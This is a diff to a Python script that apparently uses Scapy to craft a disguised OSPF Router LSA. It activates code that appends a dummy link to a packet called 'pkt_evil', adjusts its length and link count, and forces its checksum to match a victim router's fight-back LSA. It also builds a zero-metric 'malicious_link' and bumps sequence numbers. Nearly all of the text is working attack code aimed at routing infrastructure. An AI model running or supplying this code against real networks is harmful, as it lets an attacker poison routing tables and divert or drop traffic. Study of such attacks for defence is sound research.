@@ -182,24 +182,6 @@ if __name__ == '__main__':
 	pkt_org1 = a[42].copy()
 
 
-	"""
-	Generate the disguised LSA. This is an example, change it accordingly to your
-	goal.
-	"""
-
-	"""
-  Link type   Description       Link ID
-                   __________________________________________________
-                   1           Point-to-point    Neighbor Router ID
-                               link
-                   2           Link to transit   Interface address of
-                               network           Designated Router
-                   3           Link to stub      IP network number
-                               network
-                   4           Virtual link      Neighbor Router ID
-
-	"""
-
 
 	malicious_link = OSPF_Link(	metric=0,
 								toscount=0,
@@ -234,37 +216,28 @@ if __name__ == '__main__':
 	# # # Calculate the disguised packet 					#
 	# # #####################################################
 
-	# print("[+] Let's bruteforce the checksum!")
-
-	# """
-	# Preparing the OSPF Link to fake the checksum.
-	# """
-	# checksum_link = OSPF_Link(	metric=10,
-	# 							toscount=0,
-	# 							type=3,
-	# 							data= "255.255.255.0",
-	# 							id= "10.0.10.5")
-
-	# """
-	# Addition of an OSPF Link in the LSA_disguised packet in order to change the checksum later.
-	# """
-	# pkt_evil[OSPF_LSUpd].lsalist[victim_lsa_index][OSPF_Router_LSA].linklist.extend(checksum_link)
-
-	# """
-	# Compliance of the packet (increase size + nb link).
-	# """
-	# pkt_evil[OSPF_LSUpd].lsalist[victim_lsa_index][OSPF_Router_LSA].len += 12
-	# pkt_evil[OSPF_LSUpd].lsalist[victim_lsa_index][OSPF_Router_LSA].linkcount = len(pkt_evil[OSPF_LSUpd].lsalist[victim_lsa_index][OSPF_Router_LSA].linklist)
+	print("[+] Let's bruteforce the checksum!")
 
 	"""
-	ORIGINAL SOLUTION:
-	Get the value to modify the dummy link in order to have the same checksum as the fight back
-	index of the dummy link - "metric":[1], "Tos":[3], "type":[4], "link_data":[5,6,7,8], "DR":[9,10,11,12]
-	For example ind = [1,4], val = [49,12] -> metric = 49 and type =12
-	IMPROVED SOLUTION:
-	Due to the fact that the metric is 2 bytes long and that C0 and C1 are always evaluated as mod(255),
-	there is no need to change all the other parameters.
+	Preparing the OSPF Link to fake the checksum.
 	"""
+	checksum_link = OSPF_Link(	metric=10,
+								toscount=0,
+								type=3,
+								data= "255.255.255.0",
+								id= "10.0.10.5")
+
+	"""
+	Addition of an OSPF Link in the LSA_disguised packet in order to change the checksum later.
+	"""
+	pkt_evil[OSPF_LSUpd].lsalist[victim_lsa_index][OSPF_Router_LSA].linklist.extend(checksum_link)
+
+	"""
+	Compliance of the packet (increase size + nb link).
+	"""
+	pkt_evil[OSPF_LSUpd].lsalist[victim_lsa_index][OSPF_Router_LSA].len += 12
+	pkt_evil[OSPF_LSUpd].lsalist[victim_lsa_index][OSPF_Router_LSA].linkcount = len(pkt_evil[OSPF_LSUpd].lsalist[victim_lsa_index][OSPF_Router_LSA].linklist)
+
 	count = pkt_evil[OSPF_LSUpd].lsalist[victim_lsa_index][OSPF_Router_LSA].linkcount -1
 	print(pkt_org1.show())
 	pkt_org1[OSPF_LSUpd].lsalist[victim_lsa_index][OSPF_Router_LSA].seq += 2
